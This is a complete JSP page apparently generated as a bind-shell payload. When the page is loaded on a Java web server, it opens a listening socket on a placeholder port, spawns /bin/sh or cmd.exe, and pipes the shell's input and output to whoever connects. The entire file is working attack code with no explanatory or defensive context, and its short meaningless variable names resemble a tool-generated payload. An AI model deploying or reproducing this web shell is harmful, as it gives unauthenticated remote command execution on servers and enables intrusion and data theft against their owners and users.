<%@page import="java.lang.*"%>
<%@page import="java.util.*"%>
<%@page import="java.io.*"%>
<%@page import="java.net.*"%>

<%
  class StreamConnector extends Thread
  {
    InputStream ca;
    OutputStream sm;

    StreamConnector( InputStream ca, OutputStream sm )
    {
      this.ca = ca;
      this.sm = sm;
    }

    public void run()
    {
      BufferedReader ec  = null;
      BufferedWriter bcu = null;
      try
      {
        ec  = new BufferedReader( new InputStreamReader( this.ca ) );
        bcu = new BufferedWriter( new OutputStreamWriter( this.sm ) );
        char buffer[] = new char[8192];
        int length;
        while( ( length = ec.read( buffer, 0, buffer.length ) ) > 0 )
        {
          bcu.write( buffer, 0, length );
          bcu.flush();
        }
      } catch( Exception e ){}
      try
      {
        if( ec != null )
          ec.close();
        if( bcu != null )
          bcu.close();
      } catch( Exception e ){}
    }
  }

  try
  {
    String ShellPath;
    if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
        ShellPath = new String("/bin/sh");
    } else {
        ShellPath = new String("cmd.exe");
    }

    ServerSocket server_socket = new ServerSocket( PORTPORT );
    Socket client_socket = server_socket.accept();
    server_socket.close();
    Process process = Runtime.getRuntime().exec( ShellPath );
    ( new StreamConnector( process.getInputStream(), client_socket.getOutputStream() ) ).start();
    ( new StreamConnector( client_socket.getInputStream(), process.getOutputStream() ) ).start();
  } catch( Exception e ) {}
%>
